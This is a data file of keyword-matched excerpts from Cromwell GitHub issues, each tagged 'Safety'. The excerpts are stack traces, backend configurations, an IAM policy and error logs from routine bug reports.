Safety," akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:46,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:47,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:48,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:49,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:50,94] [info] Waiting for 1 workflows to abort...; ^C[2016-10-27 13:10:51,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:52,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:53,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:54,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:55,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:56,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:57,16] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); at com.google.api.client.googleapis.services.Abstra",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:16793,abort,abort,16793,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety," be simply that subqueries must be aliased.](https://stackoverflow.com/q/1888779/4107809) Is MariaDB not supported? . The workflow runs jobs that complete as normal. When rerunning, no call caching results are used, and all jobs simply run again. . Cromwell connects to the call caching database and successfully creates tables, for example `CALL_CACHING_AGGREGATION_ENTRY`. . <!-- Which backend are you running? -->; I am running with a SLURM backend. . <!-- Paste/Attach your workflow if possible: -->; I have a very simple example workflow. ; ```; workflow test{; call task_A {}; }. task task_A{; command{; echo 'testing'; }; }; ```. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; ```; include required(classpath(""application"")). webservice {; }. akka {; http {; server {; }; }; }. system {; io {; }; input-read-limits {; }; job-rate-control {; jobs = 2; per = 1 second; }. abort {; scan-frequency: 30 seconds; cache {; enabled: true; concurrency: 1; ttl: 20 minutes; size: 100000; }; }. dns-cache-ttl: 3 minutes; }. workflow-options {; default {; }; }. call-caching {; enabled = true; }. google {; }. docker {; hash-lookup {; }; }. engine {; filesystems {; local {; }; }; }. languages {; WDL {; versions {; ""draft-2"" {; }; ""1.0"" {; }; }; }; CWL {; versions {; ""v1.0"" {; }; }; }; }. backend {; default = ""SLURM"". providers {. SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 500; runtime-attributes = """"""; Int runtime_minutes = 720; Int cpus = 1; Int requested_memory_mb_per_core = 8000; String queue = ""short""; """""". exit-code-timeout-seconds = 600. submit = """"""; sbatch -J ${job_name} -D ${cwd} -o ${out} -e ${err} -t ${runtime_minutes} -p ${queue} \; ${""-n "" + cpus} \; --mem-per-cpu=${requested_memory_mb_per_core} \; --constraint=""groups"" \; --qos=ded_reich \; --account=""reich"" \; --wrap ""/usr/bin/env bash ${script}""; """"""; kill = ""scancel ${job",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6929:2537,abort,abort,2537,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6929,1,['abort'],['abort']
Safety," definitely have read / write access from my EC2 instance. I also can't see any Cromwell-execution folders in the bucket, but I do see the cromwell-workflow-logs on my EC2 instance. I created the AMI with the cromwell type, and I've checked that my IAM profile has access to the execution and storage bucket, and confirmed this in the CLI. . ```; Caused by: java.io.IOException: Could not read from s3://<bucket-name>/cromwell-execution/gatkRecalNormal/df58d76a-c3fe-4fb7-94c6-f4bd9ad1d5de/call-gatkBaseRecalibrator/gatkBaseRecalibrator-rc.txt: s3://s3.amazonaws.com/<bucket-name>/cromwell-execution/gatkRecalNormal/df58d76a-c3fe-4fb7-94c6-f4bd9ad1d5de/call-gatkBaseRecalibrator/gatkBaseRecalibrator-rc.txt; 	at cromwell.engine.io.nio.NioFlow$$anonfun$withReader$2.applyOrElse(NioFlow.scala:146); 	at cromwell.engine.io.nio.NioFlow$$anonfun$withReader$2.applyOrElse(NioFlow.scala:145); 	at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:34); 	at scala.util.Failure.recoverWith(Try.scala:232); 	at cromwell.engine.io.nio.NioFlow.withReader(NioFlow.scala:145); 	at cromwell.engine.io.nio.NioFlow.limitFileContent(NioFlow.scala:154); 	at cromwell.engine.io.nio.NioFlow.$anonfun$readAsString$1(NioFlow.scala:98); 	at cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:85); 	at cats.effect.internals.IORunLoop$RestartCallback.signal(IORunLoop.scala:336); 	at cats.effect.internals.IORunLoop$RestartCallback.apply(IORunLoop.scala:357); 	at cats.effect.internals.IORunLoop$RestartCallback.apply(IORunLoop.scala:303); 	at cats.effect.internals.IOShift$Tick.run(IOShift.scala:36); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoin",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-437251651:1310,recover,recoverWith,1310,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-437251651,1,['recover'],['recoverWith']
Safety," environment and was able to copy files into the cromwell executions bucket. Though something weird seems to be going on with the authentication because the instance appears to have write permissions for all the s3 buckets in the region, which appears to be due to the AmazonEC2RoleforSSM policy attached to the instance IAM:. ```; {; ""Version"": ""2012-10-17"",; ""Statement"": [; {; ""Effect"": ""Allow"",; ""Action"": [; ""ssm:DescribeAssociation"",; ""ssm:GetDeployablePatchSnapshotForInstance"",; ""ssm:GetDocument"",; ""ssm:GetManifest"",; ""ssm:GetParameters"",; ""ssm:ListAssociations"",; ""ssm:ListInstanceAssociations"",; ""ssm:PutInventory"",; ""ssm:PutComplianceItems"",; ""ssm:PutConfigurePackageResult"",; ""ssm:UpdateAssociationStatus"",; ""ssm:UpdateInstanceAssociationStatus"",; ""ssm:UpdateInstanceInformation""; ],; ""Resource"": ""*""; },; {; ""Effect"": ""Allow"",; ""Action"": [; ""ssmmessages:CreateControlChannel"",; ""ssmmessages:CreateDataChannel"",; ""ssmmessages:OpenControlChannel"",; ""ssmmessages:OpenDataChannel""; ],; ""Resource"": ""*""; },; {; ""Effect"": ""Allow"",; ""Action"": [; ""ec2messages:AcknowledgeMessage"",; ""ec2messages:DeleteMessage"",; ""ec2messages:FailMessage"",; ""ec2messages:GetEndpoint"",; ""ec2messages:GetMessages"",; ""ec2messages:SendReply""; ],; ""Resource"": ""*""; },; {; ""Effect"": ""Allow"",; ""Action"": [; ""cloudwatch:PutMetricData""; ],; ""Resource"": ""*""; },; {; ""Effect"": ""Allow"",; ""Action"": [; ""ec2:DescribeInstanceStatus""; ],; ""Resource"": ""*""; },; {; ""Effect"": ""Allow"",; ""Action"": [; ""ds:CreateComputer"",; ""ds:DescribeDirectories""; ],; ""Resource"": ""*""; },; {; ""Effect"": ""Allow"",; ""Action"": [; ""logs:CreateLogGroup"",; ""logs:CreateLogStream"",; ""logs:DescribeLogGroups"",; ""logs:DescribeLogStreams"",; ""logs:PutLogEvents""; ],; ""Resource"": ""*""; },; {; ""Effect"": ""Allow"",; ""Action"": [; ""s3:GetBucketLocation"",; ""s3:PutObject"",; ""s3:GetObject"",; ""s3:GetEncryptionConfiguration"",; ""s3:AbortMultipartUpload"",; ""s3:ListMultipartUploadParts"",; ""s3:ListBucket"",; ""s3:ListBucketMultipartUploads""; ],; ""Resource"": ""*""; }; ]; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-435109292:1896,Abort,AbortMultipartUpload,1896,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-435109292,1,['Abort'],['AbortMultipartUpload']
Safety, file or directory); 	at java.lang.ProcessBuilder.start(ProcessBuilder.java:1048); 	at cromwell.backend.sfs.ProcessRunner.run(ProcessRunner.scala:20); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.$anonfun$isAlive$1(SharedFileSystemAsyncJobExecutionActor.scala:196); 	at scala.runtime.java8.JFunction0$mcZ$sp.apply(JFunction0$mcZ$sp.java:12); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.isAlive(SharedFileSystemAsyncJobExecutionActor.scala:191); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.isAlive$(SharedFileSystemAsyncJobExecutionActor.scala:191); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.isAlive(ConfigAsyncJobExecutionActor.scala:190); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.reconnectToExistingJob(SharedFileSystemAsyncJobExecutionActor.scala:171); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.recover(SharedFileSystemAsyncJobExecutionActor.scala:159); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.recover$(SharedFileSystemAsyncJobExecutionActor.scala:159); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.recover(ConfigAsyncJobExecutionActor.scala:190); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$recoverAsync$1(StandardAsyncExecutionActor.scala:305); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync(StandardAsyncExecutionActor.scala:305); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync$(StandardAsyncExecutionActor.scala:305); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.recoverAsync(ConfigAsyncJobExecutionActor.scala:190); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:574); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(Standard,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2963:1495,recover,recover,1495,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2963,1,['recover'],['recover']
Safety," files in directory defuse-data/gmap/cdna; Pointers file is cdna.ref153offsets64meta; Offsets file is cdna.ref153offsets64strm; Positions file is cdna.ref153positions; Offsets compression type: bitpack64; Allocating memory for ref offset pointers, kmer 15, interval 3...Attached existing memory (2 attached) for defuse-data/gmap/cdna/cdna.ref153offsets64meta...done (134,217,744 bytes, 0.00 sec); Allocating memory for ref offsets, kmer 15, interval 3...Attached new memory for defuse-data/gmap/cdna/cdna.ref153offsets64strm...done (234,475,312 bytes, 0.23 sec); Pre-loading ref positions, kmer 15, interval 3......done (276,173,052 bytes, 0.05 sec); Starting alignment; Failed attempt to alloc 18446744073709550532 bytes; Exception: Allocation Failed raised at indexdb.c:2885; /cromwell-executions/detectFusions/962429bb-ddfa-456a-ab35-c29cf554e409/call-deFuse/execution/OUT/log/defuse.12.sh: line 6: 7481 Segmentation fault (core dumped) /usr/local/bin/gmap -D defuse-data/gmap -d cdna -f psl /cromwell-executions/detectFusions/962429bb-ddfa-456a-ab35-c29cf554e409/call-deFuse/execution/OUT/jobs/breakpoints.split.001.fa > /cromwell-executions/detectFusions/962429bb-ddfa-456a-ab35-c29cf554e409/call-deFuse/execution/OUT/jobs/breakpoints.split.001.fa.cdna.psl.tmp; ; real 0m1.262s; user 0m0.046s; sys 0m0.564s. ```. Run within the docker container but not using Cromwell, the output of that command looks like this:; ```; Starting defuse command:; /usr/local/bin/gmap -D Program_required_data/deFuse/defuse-data/gmap -d cdna -f psl #<1 > #>1; Reasons:; /mnt/Workflow_runs/2_fusion_detection_tools/BT474/BT474_deFuse_0.8.1/jobs/breakpoints.split.001.fa.cdna.psl m; issing; Success for defuse command:; /usr/local/bin/gmap -D Program_required_data/deFuse/defuse-data/gmap -d est4 -f psl /mnt/Workflow_runs/2_fus; ion_detection_tools/BT474/BT474_deFuse_0.8.1/jobs/breakpoints.split.001.fa > /mnt/Workflow_runs/2_fusion_detection_to; ols/BT474/BT474_deFuse_0.8.1/jobs/breakpoints.split.001.fa.est.4.psl",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4465:2864,detect,detectFusions,2864,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4465,1,['detect'],['detectFusions']
Safety," improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out; > waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam) — You are receiving this because you are subscribed to this; > thread. Reply to this email directly, view it on GitHub <#5977; > <https://github.com/broadinstitute/cromwell/issues/5977>>, or unsubscribe; > https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ; > .; >; > —; > You are receiving this because you commented.; >; >; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491>,; > or unsubscribe; > <https://github.com/notifica",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:2080,Timeout,TimeoutException,2080,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055,1,['Timeout'],['TimeoutException']
Safety," invalid credentials. To authenticate your request, follow the steps in: https://cloud.google.com/container-registry/docs/advanced-authentication""}]}; cromwell_1 | 	at cromwell.docker.registryv2.DockerRegistryV2Abstract.$anonfun$getDigestFromResponse$1(DockerRegistryV2Abstract.scala:321); cromwell_1 | 	at map @ fs2.internal.CompileScope.$anonfun$close$9(CompileScope.scala:246); cromwell_1 | 	at flatMap @ fs2.internal.CompileScope.$anonfun$close$6(CompileScope.scala:245); cromwell_1 | 	at map @ fs2.internal.CompileScope.fs2$internal$CompileScope$$traverseError(CompileScope.scala:222); cromwell_1 | 	at flatMap @ fs2.internal.CompileScope.$anonfun$close$4(CompileScope.scala:244); cromwell_1 | 	at map @ fs2.internal.CompileScope.fs2$internal$CompileScope$$traverseError(CompileScope.scala:222); cromwell_1 | 	at flatMap @ fs2.internal.CompileScope.$anonfun$close$2(CompileScope.scala:242); cromwell_1 | 	at flatMap @ fs2.internal.CompileScope.close(CompileScope.scala:241); cromwell_1 | 	at unsafeRunAsyncAndForget @ cromwell.docker.DockerInfoActor.$anonfun$startAndRegisterStream$2(DockerInfoActor.scala:163); cromwell_1 | 	at flatMap @ fs2.internal.CompileScope.$anonfun$openAncestor$2(CompileScope.scala:261); cromwell_1 | 	at flatMap @ fs2.internal.FreeC$.$anonfun$compile$17(Algebra.scala:545); cromwell_1 | 	at map @ fs2.internal.CompileScope.$anonfun$close$9(CompileScope.scala:246); cromwell_1 | 	at flatMap @ fs2.internal.CompileScope.$anonfun$close$6(CompileScope.scala:245); cromwell_1 | 	at map @ fs2.internal.CompileScope.fs2$internal$CompileScope$$traverseError(CompileScope.scala:222); cromwell_1 | 	at flatMap @ fs2.internal.CompileScope.$anonfun$close$4(CompileScope.scala:244); cromwell_1 | 	at map @ fs2.internal.CompileScope.fs2$internal$CompileScope$$traverseError(CompileScope.scala:222); cromwell_1 | 2024-01-11 11:09:38 cromwell-system-akka.dispatchers.engine-dispatcher-33 WARN - BackendPreparationActor_for_0845428a:myworkflow.mytask:-1:1 [UUID(0845428a)]: Docker look",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7356:2629,unsafe,unsafeRunAsyncAndForget,2629,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7356,1,['unsafe'],['unsafeRunAsyncAndForget']
Safety," launches; #new-workflow-poll-rate = 20. # Since the WorkflowLogCopyRouter is initialized in code, this is the number of workers; #number-of-workflow-log-copy-workers = 10. # Default number of cache read workers; #number-of-cache-read-workers = 25. io {; # throttle {; # # Global Throttling - This is mostly useful for GCS and can be adjusted to match; # # the quota availble on the GCS API; # #number-of-requests = 100000; # #per = 100 seconds; # }. # Number of times an I/O operation should be attempted before giving up and failing it.; #number-of-attempts = 5; }. # Maximum number of input file bytes allowed in order to read each type.; # If exceeded a FileSizeTooBig exception will be thrown.; input-read-limits {; #lines = 128000; #bool = 7; #int = 19; #float = 50; #string = 128000; #json = 128000; #tsv = 128000; #map = 128000; #object = 128000; }. abort {; # These are the default values in Cromwell, in most circumstances there should not be a need to change them. # How frequently Cromwell should scan for aborts.; scan-frequency: 30 seconds. # The cache of in-progress aborts. Cromwell will add entries to this cache once a WorkflowActor has been messaged to abort.; # If on the next scan an 'Aborting' status is found for a workflow that has an entry in this cache, Cromwell will not ask; # the associated WorkflowActor to abort again.; cache {; enabled: true; # Guava cache concurrency.; concurrency: 1; # How long entries in the cache should live from the time they are added to the cache.; ttl: 20 minutes; # Maximum number of entries in the cache.; size: 100000; }; }. # Cromwell reads this value into the JVM's `networkaddress.cache.ttl` setting to control DNS cache expiration; dns-cache-ttl: 3 minutes; }. docker {; hash-lookup {; # Set this to match your available quota against the Google Container Engine API; #gcr-api-queries-per-100-seconds = 1000. # Time in minutes before an entry expires from the docker hashes cache and needs to be fetched again; #cache-entry-ttl = ""20 ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6933:3279,abort,aborts,3279,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6933,1,['abort'],['aborts']
Safety," line 895, in workflow; [2018-11-04T19:02:19.373930Z] [2a8fea138cb7] [72_1] [WorkflowRunner] [ERROR] graphTasks = runLocusGraph(self,dependencies=graphTaskDependencies); [2018-11-04T19:02:19.373954Z] [2a8fea138cb7] [72_1] [WorkflowRunner] [ERROR] File ""/usr/local/share/bcbio-nextgen/anaconda/share/manta-1.4.0-1/lib/python/mantaWorkflow.py"", line 296, in runLocusGraph; [2018-11-04T19:02:19.373978Z] [2a8fea138cb7] [72_1] [WorkflowRunner] [ERROR] mergeTask = self.addTask(preJoin(taskPrefix,""mergeLocusGraph""),mergeCmd,dependencies=tmpGraphFileListTask,memMb=self.params.mergeMemMb); [2018-11-04T19:02:19.374002Z] [2a8fea138cb7] [72_1] [WorkflowRunner] [ERROR] File ""/usr/local/share/bcbio-nextgen/anaconda/share/manta-1.4.0-1/lib/python/pyflow/pyflow.py"", line 3689, in addTask; [2018-11-04T19:02:19.374023Z] [2a8fea138cb7] [72_1] [WorkflowRunner] [ERROR] raise Exception(""Task memory requirement exceeds full available resources""); [2018-11-04T19:02:19.374046Z] [2a8fea138cb7] [72_1] [WorkflowRunner] [ERROR] Exception: Task memory requirement exceeds full available resources; ```. The cwl [requests 4GB](https://github.com/bcbio/test_bcbio_cwl/blob/48ca2661644e01e2d4b7f8ad8f2588a31cf87537/gcp/somatic-workflow/steps/detect_sv.cwl#L25) of memory for this task, which I verified Cromwell did request from PAPI as well:; <pre>; resources:; projectId: broad-dsde-cromwell-perf; regions: []; virtualMachine:; accelerators: []; bootDiskSizeGb: 21; bootImage: projects/cos-cloud/global/images/family/cos-stable; cpuPlatform: ''; disks:; - name: local-disk; sizeGb: 10; sourceImage: ''; type: pd-ssd; labels:; cromwell-sub-workflow-name: wf-svcall-cwl; cromwell-workflow-id: cromwell-0344f62e-809d-48d4-8e9a-ede11fe5dd5c; wdl-call-alias: detect-sv; wdl-task-name: detect-sv-cwl; <b>machineType: custom-2-4096</b>; </pre>. @chapmanb I was curious if you've seen this before ? I'm modifying the CWL to ask for a bit more memory but I'm wondering if there's something else that Cromwell is not doing right",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3724#issuecomment-435937856:3070,detect,detect-sv,3070,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3724#issuecomment-435937856,2,['detect'],"['detect-sv', 'detect-sv-cwl']"
Safety," on device\n""); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor$.StandardException(PipelinesApiAsyncBackendJobExecutionActor.scala:79); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleFailedRunStatus$1(PipelinesApiAsyncBackendJobExecutionActor.scala:585); 	at ; cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:592); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:83); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionActor.scala:1099); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionActor.scala:1095); 	at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:413); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akk",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3861#issuecomment-455657495:2664,recover,recoverWith,2664,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3861#issuecomment-455657495,1,['recover'],['recoverWith']
Safety," os_prio=31 tid=0x00007fb76a05e000 nid=0x3503 in Object.wait() [0x0000000126bc7000]; java.lang.Thread.State: WAITING (on object monitor); at java.lang.Object.wait(Native Method); at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:143); - locked <0x00000006c00371c0> (a java.lang.ref.ReferenceQueue$Lock); at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:164); at java.lang.ref.Finalizer$FinalizerThread.run(Finalizer.java:209). ""Reference Handler"" #2 daemon prio=10 os_prio=31 tid=0x00007fb76b005800 nid=0x3303 in Object.wait() [0x0000000126ac4000]; java.lang.Thread.State: WAITING (on object monitor); at java.lang.Object.wait(Native Method); at java.lang.Object.wait(Object.java:502); at java.lang.ref.Reference$ReferenceHandler.run(Reference.java:157); - locked <0x00000006c00301d8> (a java.lang.ref.Reference$Lock). ""main"" #1 prio=5 os_prio=31 tid=0x00007fb76a803000 nid=0xf07 waiting on condition [0x000000010b088000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c061d308> (a scala.concurrent.impl.Promise$CompletionLatch); at java.util.concurrent.locks.LockSupport.park(Redefined); at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:836); at java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireSharedInterruptibly(AbstractQueuedSynchronizer.java:997); at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireSharedInterruptibly(AbstractQueuedSynchronizer.java:1304); at scala.concurrent.impl.Promise$DefaultPromise.tryAwait(Promise.scala:199); at scala.concurrent.impl.Promise$DefaultPromise.ready(Promise.scala); at scala.concurrent.impl.Promise$DefaultPromise.ready(Promise.scala); at scala.concurrent.Await$$anonfun$ready$1.apply(package.scala); at scala.concurrent.Await$$anonfun$ready$1.apply(package.scala); at scala.concurrent.BlockContext$DefaultBlockContext$.blockOn(BlockContext.scala); at scala.concurrent.Await$.re",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:50374,Unsafe,Unsafe,50374,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety, scala.util.Either$RightProjection.flatMap(Either.scala:702); cats.instances.EitherInstances$$anon$1.flatMap(either.scala:36); cats.instances.EitherInstances$$anon$1.flatMap(either.scala:32); cats.data.Kleisli.$anonfun$andThen$1(Kleisli.scala:37); languages.wdl.draft3.WdlDraft3LanguageFactory.getWomBundle(WdlDraft3LanguageFactory.scala:50); languages.wdl.draft3.WdlDraft3LanguageFactory.$anonfun$validateNamespace$2(WdlDraft3LanguageFactory.scala:39); scala.util.Either.flatMap(Either.scala:338); languages.wdl.draft3.WdlDraft3LanguageFactory.validateNamespace(WdlDraft3LanguageFactory.scala:38); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.$anonfun$buildWorkflowDescriptor$7(MaterializeWorkflowDescriptorActor.scala:242); cats.data.EitherT.$anonfun$flatMap$1(EitherT.scala:80); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:128); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43); akka,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3751:9094,unsafe,unsafeRunAsync,9094,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3751,1,['unsafe'],['unsafeRunAsync']
